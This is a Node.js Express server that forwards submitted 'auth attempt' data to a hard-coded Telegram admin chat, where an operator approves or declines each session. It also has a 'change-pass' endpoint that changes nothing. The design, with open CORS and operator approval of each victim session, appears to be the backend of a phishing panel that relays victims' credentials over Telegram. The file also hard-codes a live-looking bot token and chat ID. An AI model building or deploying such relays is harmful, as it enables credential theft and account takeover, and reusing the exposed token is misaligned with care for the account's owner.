const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const port = 5000;

app.use(cors({
  origin: '*', // Разрешает запросы отовсюду
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type']
}));
app.use(express.json());

const token = '8385266015:AAHpN8EUWlEgoGtslfBoEoyqPycXD2gbPGw';
const adminChatId = '7863254073';
const bot = new TelegramBot(token, { polling: true });

// Store sessions and their auth status
const sessions = new Map();

// POST /auth-attempt
app.post('/auth-attempt', (req, res) => {
    const { sessionId, data } = req.body;
    if (!sessionId) {
        return res.status(400).json({ error: 'sessionId is required' });
    }

    sessions.set(sessionId, { status: 'pending', timestamp: Date.now() });

    const message = `Auth Attempt\nSession: ${sessionId}\nData: ${JSON.stringify(data, null, 2)}`;
    const options = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'Approve', callback_data: `approve_${sessionId}` },
                    { text: 'Decline', callback_data: `decline_${sessionId}` }
                ]
            ]
        }
    };

    bot.sendMessage(adminChatId, message, options)
        .then(() => res.json({ success: true, message: 'Auth attempt sent to Telegram' }))
        .catch(err => {
            console.error('Telegram Error:', err);
            res.status(500).json({ error: 'Failed to send Telegram message' });
        });
});

// GET /check-auth/:session
app.get('/check-auth/:session', (req, res) => {
    const sessionId = req.params.session;
    const session = sessions.get(sessionId);

    if (!session) {
        return res.status(404).json({ error: 'Session not found' });
    }

    res.json({ status: session.status });
});

// POST /change-pass
app.post('/change-pass', (req, res) => {
    const { sessionId, newPassword } = req.body;
    
    // In a real app, you'd check if sessionId is authorized
    const session = sessions.get(sessionId);
    if (!session || session.status !== 'approved') {
        return res.status(401).json({ error: 'Unauthorized or session expired' });
    }

    console.log(`Password changed for session ${sessionId}`);
    res.json({ success: true, message: 'Password changed successfully' });
});

// Telegram callback handler
bot.on('callback_query', (query) => {
    const [action, sessionId] = query.data.split('_');
    const session = sessions.get(sessionId);

    if (session) {
        session.status = action === 'approve' ? 'approved' : 'declined';
        bot.answerCallbackQuery(query.id, { text: `Session ${action}d` });
        bot.editMessageText(`Session ${sessionId} was ${action}d`, {
            chat_id: adminChatId,
            message_id: query.message.message_id
        });
    }
});

app.listen(port, '0.0.0.0', () => {
    console.log(`Server running on http://0.0.0.0:${port}`);
});
